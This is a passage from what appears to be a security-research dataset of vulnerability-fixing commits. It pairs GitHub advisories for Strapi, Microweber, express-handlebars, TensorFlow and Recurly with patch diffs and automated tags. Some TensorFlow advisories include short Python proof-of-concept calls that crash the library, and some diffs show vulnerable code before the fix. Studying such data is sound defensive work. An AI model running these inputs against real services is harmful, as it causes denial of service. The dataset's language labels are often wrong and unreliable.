[\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"/components/:uid\",\\n       \"handler\": \"Components.updateComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"/components/:uid\",\\n       \"handler\": \"Components.deleteComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"/component-categories/:name\",\\n       \"handler\": \"ComponentCategories.editCategory\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"/component-categories/:name\",\\n       \"handler\": \"ComponentCategories.deleteCategory\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     }\\n   ]'}}",
      "message_norm": "merge pull request #8439 from strapi/fix/ctb-permissions\n\nadd permission to ctb routes",
      "language": "fr",
      "entities": "[('#8439', 'ISSUE', ''), ('permissions', 'SECWORD', ''), ('add', 'ACTION', ''), ('permission', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['packages/strapi-plugin-content-type-builder/config/routes.json'])",
      "num_files": 1.0
    },
    {
      "index": 1098,
      "vuln_id": "GHSA-7x2h-3v2v-24p9",
      "cwe_id": "{'CWE-352'}",
      "score": 6.5,
      "chain": "{'https://github.com/microweber/microweber/commit/63447b369973724f0d352a006f25af6ff71ae292'}",
      "dataset": "osv",
      "summary": "Cross-Site Request Forgery in microweber microweber version 1.2.10 and prior is vulnerable to cross-site request forgery.",
      "published_date": "2022-02-09",
      "chain_len": 1,
      "project": "https://github.com/microweber/microweber",
      "commit_href": "https://github.com/microweber/microweber/commit/63447b369973724f0d352a006f25af6ff71ae292",
      "commit_sha": "63447b369973724f0d352a006f25af6ff71ae292",
      "patch": "SINGLE",
      "chain_ord": "['63447b369973724f0d352a006f25af6ff71ae292']",
      "before_first_fix_commit": "{'d61ad9db07ef09652a3deb24c26274da2ded1493'}",
      "last_fix_commit": "63447b369973724f0d352a006f25af6ff71ae292",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/02/2022, 11:06:34",
      "message": "Update api.php",
      "author": "Bozhidar Slaveykov",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'src/MicroweberPackages/Content/routes/api.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/microweber/microweber/raw/63447b369973724f0d352a006f25af6ff71ae292/src%2FMicroweberPackages%2FContent%2Froutes%2Fapi.php', 'patch': \"@@ -75,7 +75,7 @@\\n \\n         Route::post('content/delete', function (\\\\Illuminate\\\\Http\\\\Request $request) {\\n             return mw()->content_manager->helpers->delete($request->all());\\n-        });\\n+        }); \\n \\n         Route::get('content/get_link_admin', function (\\\\Illuminate\\\\Http\\\\Request $request) {\"}}",
      "message_norm": "update api.php",
      "language": "ro",
      "entities": "[('update', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/MicroweberPackages/Content/routes/api.php'])",
      "num_files": 1.0
    },
    {
      "index": 1774,
      "vuln_id": "GHSA-fr76-2wp8-fp92",
      "cwe_id": "{'CWE-94', 'CWE-200'}",
      "score": 8.6,
      "chain": "{'https://github.com/express-handlebars/express-handlebars/commit/78c47a235c4ad7bc2674bddd8ec2721567ed8c72'}",
      "dataset": "osv",
      "summary": "Insecure template handling in Express-handlebars Express-handlebars is a Handlebars view engine for Express. Express-handlebars mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extentions (i.e. file.extension) can be included, files that lack an extension will have .handlebars appended to them. For complete details refer to the referenced GHSL-2021-018 report. Notes in documentation have been added to help users avoid this potential information exposure vulnerability.\n\nA fix is discussed in https://github.com/express-handlebars/express-handlebars/pull/163",
      "published_date": "2022-02-10",
      "chain_len": 1,
      "project": "https://github.com/express-handlebars/express-handlebars",
      "commit_href": "https://github.com/express-handlebars/express-handlebars/commit/78c47a235c4ad7bc2674bddd8ec2721567ed8c72",
      "commit_sha": "78c47a235c4ad7bc2674bddd8ec2721567ed8c72",
      "patch": "SINGLE",
      "chain_ord": "['78c47a235c4ad7bc2674bddd8ec2721567ed8c72']",
      "before_first_fix_commit": "{'2cde11e4d4b5aabf0c7bef5725eda629c51eeb92'}",
      "last_fix_commit": "78c47a235c4ad7bc2674bddd8ec2721567ed8c72",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/04/2021, 14:04:07",
      "message": "fix: add note about security",
      "author": "Tony Brix",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'README.md': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/express-handlebars/express-handlebars/raw/78c47a235c4ad7bc2674bddd8ec2721567ed8c72/README.md', 'patch': '@@ -63,6 +63,9 @@ Install using npm:\\n $ npm install express-handlebars\\n ```\\n \\n+## Danger \ud83d\udd25\\n+ \\n+Never put objects on the `req` object straight in as the data, this can allow hackers to run XSS attacks. Always make sure you are destructuring the values on objects like `req.query` and `req.params`. See https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/ for more details.\\n \\n ## Usage'}}",
      "message_norm": "fix: add note about security",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('add', 'ACTION', ''), ('security', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['README.md'])",
      "num_files": 1.0
    },
    {
      "index": 713,
      "vuln_id": "GHSA-5wpj-c6f7-24x8",
      "cwe_id": "{'CWE-475', 'CWE-20'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7', 'https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498'}",
      "dataset": "osv",
      "summary": "Undefined behavior when users supply invalid resource handles ### Impact\nMultiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QueueIsClosedV2(handle=[])\n```\n\n```python\nimport tensorflow as tf\n\ntf.summary.flush(writer=())\n```\n  \nIn graph mode, it would have been impossible to perform these API calls, but migration to TF 2.x eager mode opened up this vulnerability. If the resource handle is empty, then a reference is bound to a null pointer inside TensorFlow codebase (various codepaths). This is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [a5b89cd68c02329d793356bda85d079e9e69b4e7](https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7) and GitHub commit [dbdd98c37bc25249e8f288bd30d01e118a7b4498](https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University.",
      "published_date": "2022-05-24",
      "chain_len": 2,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7",
      "commit_sha": "a5b89cd68c02329d793356bda85d079e9e69b4e7",
      "patch": "MULTI",
      "chain_ord": "['dbdd98c37bc25249e8f288bd30d01e118a7b4498', 'a5b89cd68c02329d793356bda85d079e9e69b4e7']",
      "before_first_fix_commit": "{'c2ce4c72fdc9658e23dd9d42cb9ed30bdd60c2a6'}",
      "last_fix_commit": "a5b89cd68c02329d793356bda85d079e9e69b4e7",
      "chain_ord_pos": 2.0,
      "commit_datetime": "04/30/2022, 04:07:06",
      "message": "Fix empty resource handle vulnerability.\n\nSome ops that attempt to extract a resource handle from user input\ncan lead to nullptr dereferences.  This returns an error in such\na case.\n\nPiperOrigin-RevId: 445571938",
      "author": "Antonio Sanchez",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'tensorflow/core/common_runtime/eager/execute.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/a5b89cd68c02329d793356bda85d079e9e69b4e7/tensorflow%2Fcore%2Fcommon_runtime%2Feager%2Fexecute.cc', 'patch': '@@ -304,6 +304,9 @@ Status GetDeviceForInput(const EagerOperation& op, const EagerContext& ctx,\\n     const Tensor* tensor;\\n     // TODO(fishx): Avoid blocking here.\\n     TF_RETURN_IF_ERROR(tensor_handle->Tensor(&tensor));\\n+    if (tensor->NumElements() == 0) {\\n+      return errors::InvalidArgument(\"Empty resource handle\");\\n+    }\\n     const ResourceHandle& handle = tensor->flat<ResourceHandle>()(0);\\n     device_name = handle.device();'}}",
      "message_norm": "fix empty resource handle vulnerability.\n\nsome ops that attempt to extract a resource handle from user input\ncan lead to nullptr dereferences.  this returns an error in such\na case.\n\npiperorigin-revid: 445571938",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('error', 'FLAW', ''), ('445571938', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/common_runtime/eager/execute.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3147,
      "vuln_id": "GHSA-vmjw-c2vp-p33c",
      "cwe_id": "{'CWE-681'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', 'https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}",
      "dataset": "osv",
      "summary": "Crash in NMS ops caused by integer conversion to unsigned ### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  // ...\n  std::vector<int> selected;\n  // ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    // ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-08-25",
      "chain_len": 2,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d",
      "commit_sha": "3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d",
      "patch": "MULTI",
      "chain_ord": "['b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', '3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d']",
      "before_first_fix_commit": "{'a87fa31dc3becc97c7e945b9b8c8711acb92fc12'}",
      "last_fix_commit": "3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d",
      "chain_ord_pos": 2.0,
      "commit_datetime": "07/31/2021, 05:02:22",
      "message": "Prevent crash/heap OOB due to integer conversion to unsigned in NMS kernels\n\nPiperOrigin-RevId: 387938262\nChange-Id: Id361a715307e7179977cf5c64391c199a966f2ad",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 8, 'deletions': 0, 'total': 8}",
      "files": "{'tensorflow/core/kernels/image/non_max_suppression_op.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d/tensorflow%2Fcore%2Fkernels%2Fimage%2Fnon_max_suppression_op.cc', 'patch': '@@ -169,6 +169,8 @@ void DoNonMaxSuppressionOp(OpKernelContext* context, const Tensor& scores,\\n                            bool pad_to_max_output_size = false,\\n                            int* ptr_num_valid_outputs = nullptr) {\\n   const int output_size = max_output_size.scalar<int>()();\\n+  OP_REQUIRES(context, output_size >= 0,\\n+              errors::InvalidArgument(\"output size must be non-negative\"));\\n \\n   std::vector<T> scores_data(num_boxes);\\n   std::copy_n(scores.flat<T>().data(), num_boxes, scores_data.begin());\\n@@ -768,6 +770,9 @@ class NonMaxSuppressionV4Op : public OpKernel {\\n         context, scores, num_boxes, max_output_size, iou_threshold_val,\\n         score_threshold_val, dummy_soft_nms_sigma, similarity_fn,\\n         return_scores_tensor_, pad_to_max_output_size_, &num_valid_outputs);\\n+    if (!context->status().ok()) {\\n+      return;\\n+    }\\n \\n     // Allocate scalar output tensor for number of indices computed.\\n     Tensor* num_outputs_t = nullptr;\\n@@ -845,6 +850,9 @@ class NonMaxSuppressionV5Op : public OpKernel {\\n         context, scores, num_boxes, max_output_size, iou_threshold_val,\\n         score_threshold_val, soft_nms_sigma_val, similarity_fn,\\n         return_scores_tensor_, pad_to_max_output_size_, &num_valid_outputs);\\n+    if (!context->status().ok()) {\\n+      return;\\n+    }\\n \\n     // Allocate scalar output tensor for number of indices computed.\\n     Tensor* num_outputs_t = nullptr;'}}",
      "message_norm": "prevent crash/heap oob due to integer conversion to unsigned in nms kernels\n\npiperorigin-revid: 387938262\nchange-id: id361a715307e7179977cf5c64391c199a966f2ad",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('387938262', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/image/non_max_suppression_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2082,
      "vuln_id": "GHSA-hj8g-cw8x-2c6m",
      "cwe_id": "{'CWE-79'}",
      "score": 7.6,
      "chain": "{'https://github.com/microweber/microweber/commit/a5925f74d39775771d4c37c8d4c1acbb762fda0a'}",
      "dataset": "osv",
      "summary": "Cross-site Scripting in Microweber Microweber prior to version 1.3 is vulnerable to reflected cross-site scripting.",
      "published_date": "2022-02-24",
      "chain_len": 1,
      "project": "https://github.com/microweber/microweber",
      "commit_href": "https://github.com/microweber/microweber/commit/a5925f74d39775771d4c37c8d4c1acbb762fda0a",
      "commit_sha": "a5925f74d39775771d4c37c8d4c1acbb762fda0a",
      "patch": "SINGLE",
      "chain_ord": "['a5925f74d39775771d4c37c8d4c1acbb762fda0a']",
      "before_first_fix_commit": "{'0b6b1eb5ba85ffc8f74e6f5f5be9dc9f9f7e9d8f'}",
      "last_fix_commit": "a5925f74d39775771d4c37c8d4c1acbb762fda0a",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/22/2022, 10:18:26",
      "message": "Update UrlManager.php",
      "author": "Bozhidar Slaveykov",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 1, 'total': 3}",
      "files": "{'src/MicroweberPackages/Helper/UrlManager.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/microweber/microweber/raw/a5925f74d39775771d4c37c8d4c1acbb762fda0a/src%2FMicroweberPackages%2FHelper%2FUrlManager.php', 'patch': '@@ -276,7 +276,8 @@ public function string($skip_ajax = false)\\n \\n         // clear request params\\n         $cleanParam = new HTMLClean();\\n-        $u1 = $cleanParam->cleanArray($u1);\\n+        $u1 = $cleanParam->clean($u1);\\n+\\n \\n         return $u1;\\n     }'}}",
      "message_norm": "update urlmanager.php",
      "language": "sv",
      "entities": null,
      "classification_level_1": "POORLY_DOCUMENTED",
      "classification_level_2": "SUBMIT_CENTERED",
      "list_files": "dict_keys(['src/MicroweberPackages/Helper/UrlManager.php'])",
      "num_files": 1.0
    },
    {
      "index": 226,
      "vuln_id": "GHSA-38rv-5jqc-m2cv",
      "cwe_id": "{'CWE-918'}",
      "score": 0.0,
      "chain": "{'https://github.com/recurly/recurly-client-python/commit/049c74699ce93cf126feff06d632ea63fba36742'}",
      "dataset": "osv",
      "summary": "High severity vulnerability that affects recurly The Recurly Client Python Library before 2.0.5, 2.1.16, 2.2.22, 2.3.1, 2.4.5, 2.5.1, 2.6.2 is vulnerable to a Server-Side Request Forgery vulnerability in the \"Resource.get\" method that could result in compromise of API keys or other critical resources.",
      "published_date": "2019-01-04",
      "chain_len": 1,
      "project": "https://github.com/recurly/recurly-client-python",
      "commit_href": "https://github.com/recurly/recurly-client-python/commit/049c74699ce93cf126feff06d632ea63fba36742",
      "commit_sha": "049c74699ce93cf126feff06d632ea63fba36742",
      "patch": "SINGLE",
      "chain_ord": "['049c74699ce93cf126feff06d632ea63fba36742']",
      "before_first_fix_commit": "{'9db2d1a0268201571a567d73481d0d16c6fbc5e1'}",
      "last_fix_commit": "049c74699ce93cf126feff06d632ea63fba36742",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/09/2017, 00:45:28",
      "message": "Fix SSRF: do not use urljoin, quote uuids",
      "author": "Benjamin Eckel",
      "comments": null,
      "stats": "{'additions': 6, 'deletions': 6, 'total': 12}",
      "files": "{'recurly/resource.py': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https://github.com/recurly/recurly-client-python/raw/049c74699ce93cf126feff06d632ea63fba36742/recurly%2Fresource.py', 'patch': '@@ -12,8 +12,7 @@\\n import recurly.errors\\n from recurly.link_header import parse_link_value\\n from six.moves import http_client\\n-from six.moves.urllib.parse import urlencode, urljoin, urlsplit\\n-\\n+from six.moves.urllib.parse import urlencode, urlsplit, quote\\n \\n class Money(object):\\n \\n@@ -338,7 +337,8 @@ def get(cls, uuid):\\n         can be directly requested with this method.\\n \\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.member_path % (uuid,))\\n+        uuid = quote(str(uuid))\\n+        url = recurly.base_uri() + (cls.member_path % (uuid,))\\n         resp, elem = cls.element_for_url(url)\\n         return cls.from_element(elem)\\n \\n@@ -606,7 +606,7 @@ def all(cls, **kwargs):\\n         parameters.\\n \\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.collection_path)\\n+        url = recurly.base_uri() + cls.collection_path\\n         if kwargs:\\n             url = \\'%s?%s\\' % (url, urlencode(kwargs))\\n         return Page.page_for_url(url)\\n@@ -616,7 +616,7 @@ def count(cls, **kwargs):\\n         \"\"\"Return a count of server side resources given\\n         filtering arguments in kwargs.\\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.collection_path)\\n+        url = recurly.base_uri() + cls.collection_path\\n         if kwargs:\\n             url = \\'%s?%s\\' % (url, urlencode(kwargs))\\n         return Page.count_for_url(url)\\n@@ -638,7 +638,7 @@ def _update(self):\\n         return self.put(self._url)\\n \\n     def _create(self):\\n-        url = urljoin(recurly.base_uri(), self.collection_path)\\n+        url = recurly.base_uri() + self.collection_path\\n         return self.post(url)\\n \\n     def put(self, url):'}}",
      "message_norm": "fix ssrf: do not use urljoin, quote uuids",
      "language": "fr",
      "entities": "[('fix', 'ACTION', ''), ('ssrf', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['recurly/resource.py'])",
      "num_files": 1.0
    },
    {
      "index": 2244,
      "vuln_id": "GHSA-jfp7-4j67-8r3q",
      "cwe_id": "{'CWE-193', 'CWE-131'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7'}",
      "dataset": "osv",
      "summary": "Heap buffer overflow caused by rounding ### Impact\nAn attacker can trigger a heap buffer overflow in `tf.raw_ops.QuantizedResizeBilinear` by manipulating input values so that float rounding results in off-by-one error in accessing image elements:\n\n```python\nimport tensorflow as tf\n\nl = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]\nimages = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)\nsize = tf.constant([12, 6], shape=[2], dtype=tf.int32)\nmin = tf.constant(80.22522735595703)\nmax = tf.constant(80.39215850830078)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,\n                                   align_corners=True, half_pixel_centers=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L62-L66) computes two integers (representing the upper and lower bounds for interpolation) by ceiling and flooring a floating point value:\n\n```cc\nconst float in_f = std::floor(in);\ninterpolation->lower[i] = std::max(static_cast<int64>(in_f), static_cast<int64>(0));\ninterpolation->upper[i] = std::min(static_cast<int64>(std::ceil(in)), in_size - 1);\n```\n  \nFor some values of `in`, `interpolation->upper[i]` might be smaller than `interpolation->lower[i]`. This is an issue if `interpolation->upper[i]` is capped at `in_size-1` as it means that `interpolation->lower[i]` points outside of the image. Then, [in the interpolation code](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L245-L264), this would result in heap buffer overflow:\n\n```cc\ntemplate <int RESOLUTION, typename T, typename T_SCALE, typename T_CALC>\ninline void OutputLerpForChannels(const InterpolationCache<T_SCALE>& xs,\n                                  const int64 x, const T_SCALE ys_ilerp,\n                                  const int channels, const float min,\n                                  const float max, const T* ys_input_lower_ptr,\n                                  const T* ys_input_upper_ptr,\n                                  T* output_y_ptr) {\n  const int64 xs_lower = xs.lower[x];\n  ...\n  for (int c = 0; c < channels; ++c) {\n    const T top_left = ys_input_lower_ptr[xs_lower + c];\n    ...\n  }\n}\n```\n\nFor the other cases where `interpolation->upper[i]` is smaller than `interpolation->lower[i]`, we can set them to be equal without affecting the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f851613f8f0fb0c838d160ced13c134f778e3ce7](https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7",
      "commit_sha": "f851613f8f0fb0c838d160ced13c134f778e3ce7",
      "patch": "SINGLE",
      "chain_ord": "['f851613f8f0fb0c838d160ced13c134f778e3ce7']",
      "before_first_fix_commit": "{'44b7f486c0143f68b56c34e2d01e146ee445134a'}",
      "last_fix_commit": "f851613f8f0fb0c838d160ced13c134f778e3ce7",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/21/2021, 23:20:48",
      "message": "Fix heap buffer overflow caused by rounding.\n\nThis was hard to fix. Due to the way we compute the pixels that influence an output pixel in resized images, for certain input configuration we might have issued a read to a pixel that is outside of boundary of the original image. This is because of floating errors that affected truncation results.\n\nPiperOrigin-RevId: 369757871\nChange-Id: If89425fff930983829a2168203c11858883eebc9",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 0, 'total': 2}",
      "files": "{'tensorflow/core/kernels/quantized_resize_bilinear_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/f851613f8f0fb0c838d160ced13c134f778e3ce7/tensorflow%2Fcore%2Fkernels%2Fquantized_resize_bilinear_op.cc', 'patch': '@@ -64,6 +64,8 @@ inline void ComputeInterpolationWeights(\\n         std::max(static_cast<int64>(in_f), static_cast<int64>(0));\\n     interpolation->upper[i] =\\n         std::min(static_cast<int64>(std::ceil(in)), in_size - 1);\\n+    interpolation->lower[i] =\\n+        std::min(interpolation->lower[i], interpolation->upper[i]);\\n     interpolation->lerp[i] = in - in_f;\\n     interpolation->ilerp[i] =\\n         static_cast<T_SCALE>((in - in_f) * (1 << resolution));'}}",
      "message_norm": "fix heap buffer overflow caused by rounding.\n\nthis was hard to fix. due to the way we compute the pixels that influence an output pixel in resized images, for certain input configuration we might have issued a read to a pixel that is outside of boundary of the original image. this is because of floating errors that affected truncation results.\n\npiperorigin-revid: 369757871\nchange-id: if89425fff930983829a2168203c11858883eebc9",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('fix', 'ACTION', ''), ('outside of boundary', 'SECWORD', ''), ('errors', 'FLAW', ''), ('369757871', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/quantized_resize_bilinear_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 316,
      "vuln_id": "GHSA-3w67-q784-6w7c",
      "cwe_id": "{'CWE-369'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d'}",
      "dataset": "osv",
      "summary": "Division by zero in TFLite's implementation of `GatherNd` ### Impact\nThe reference implementation of the `GatherNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/reference_ops.h#L966):\n\n```cc \nret.dims_to_count[i] = remain_flat_size / params_shape.Dims(i);\n```\n\nAn attacker can craft a model such that `params` input would be an empty tensor. In turn, `params_shape.Dims(.)` would be zero, in at least one dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [8e45822aa0b9f5df4b4c64f221e64dc930a70a9d](https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d",
      "commit_sha": "8e45822aa0b9f5df4b4c64f221e64dc930a70a9d",
      "patch": "SINGLE",
      "chain_ord": "['8e45822aa0b9f5df4b4c64f221e64dc930a70a9d']",
      "before_first_fix_commit": "{'0d45ea1ca641b21b73bcf9c00e0179cda284e7e7'}",
      "last_fix_commit": "8e45822aa0b9f5df4b4c64f221e64dc930a70a9d",
      "chain_ord_pos": 1.0,
